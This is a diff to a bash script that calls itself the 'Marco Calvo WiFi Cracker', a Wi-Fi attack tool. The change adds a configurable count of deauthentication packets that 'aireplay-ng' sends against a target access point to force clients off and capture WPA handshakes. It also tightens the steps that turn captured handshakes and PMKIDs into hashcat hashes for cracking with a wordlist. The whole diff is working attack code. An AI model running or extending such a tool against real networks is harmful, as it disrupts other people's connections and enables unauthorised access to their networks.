@@ -33,6 +33,7 @@ wordlist=""
 attack_mode="HANDSHAKE"
 output_path=""
 pmkid_timeout=45
+deauth_count=5
 bssid=""
 channel=""
 ts=$(date +%s)
@@ -84,8 +85,11 @@ while [[ $# -gt 0 ]]; do
     -t|--timeout)
       [[ -z "${2:-}" ]] && bad "-t requires a value in seconds"
       pmkid_timeout="$2"; shift 2 ;;
+    -d|--deauth)
+      [[ -z "${2:-}" ]] && bad "-d requires a number of deauth packets"
+      deauth_count="$2"; shift 2 ;;
     -h|--help)
-      echo -e "${P}  Usage: sudo $0 -w <wordlist> [-a HANDSHAKE|PMKID] [-t <seconds>] [-o <outdir>]${NC}"
+      echo -e "${P}  Usage: sudo $0 -w <wordlist> [-a HANDSHAKE|PMKID] [-d <packets>] [-t <seconds>] [-o <outdir>]${NC}"
       exit 0 ;;
     *)
       bad "Invalid option: $1" ;;
@@ -98,12 +102,14 @@ done
   || bad "Attack mode must be HANDSHAKE or PMKID"
 [[ "$pmkid_timeout" =~ ^[0-9]+$ && $pmkid_timeout -ge 1 ]] \
   || bad "Timeout must be a positive number of seconds"
+[[ "$deauth_count" =~ ^[0-9]+$ && $deauth_count -ge 1 && $deauth_count -le 256 ]] \
+  || bad "Deauth count must be between 1 and 256"
 
 echo -e "\n${BOLD}${C}  MCWFCRK — Marco Calvo WiFi Cracker${NC}"
 if [[ "$attack_mode" == "PMKID" ]]; then
   echo -e "  ${BOLD}Mode: $attack_mode  |  Wordlist: $(basename "$wordlist")  |  Timeout: ${pmkid_timeout}s${NC}\n"
 else
-  echo -e "  ${BOLD}Mode: $attack_mode  |  Wordlist: $(basename "$wordlist")${NC}\n"
+  echo -e "  ${BOLD}Mode: $attack_mode  |  Wordlist: $(basename "$wordlist")  |  Deauth: ${deauth_count} packets${NC}\n"
 fi
 
 sep "Environment"
@@ -215,9 +221,9 @@ attack_handshake() {
   local cap_pid=$!
   sleep 3
 
-  info "Opening deauthentication window"
+  info "Opening deauthentication window ($deauth_count packets)"
   xterm -geometry 100x30 -fn 9x15 -title "Deauthentication Attack" -hold \
-    -e "sudo aireplay-ng -0 5 -a $bssid -c FF:FF:FF:FF:FF:FF $monitor_iface" &
+    -e "sudo aireplay-ng -0 $deauth_count -a $bssid -c FF:FF:FF:FF:FF:FF $monitor_iface" &
   local deauth_pid=$!
 
   for ((i=0; i<20; i++)); do
@@ -284,7 +290,9 @@ create_pmkid_bpf() {
 pmkid_captured() {
   local cap="$1" check="/tmp/mcwf_check_${ts}.hc22000"
   [[ -f "$cap" ]] || return 1
+  rm -f "$check"
   hcxpcapngtool "$cap" -o "$check" >/dev/null 2>&1 || return 1
+  [[ -f "$check" && -s "$check" ]] || return 1
   grep -qE '^WPA\*' "$check" 2>/dev/null
 }
 
@@ -336,10 +344,12 @@ attack_pmkid() {
   [[ -f "$pmkid_file" ]] || bad "PMKID capture file not found"
 
   info "Converting capture to hc22000 hash"
+  rm -f "$hash_file"
   hcxpcapngtool "$pmkid_file" -o "$hash_file" >/dev/null 2>&1 \
     || bad "hcxpcapngtool conversion failed"
-  grep -qE '^WPA\*' "$hash_file" \
-    || bad "No PMKID hash found for this AP"
+  if [[ ! -f "$hash_file" ]] || ! grep -qE '^WPA\*' "$hash_file" 2>/dev/null; then
+    bad "No PMKID hash found for this AP"
+  fi
 
   ok "Hash file ready: $hash_file"
 
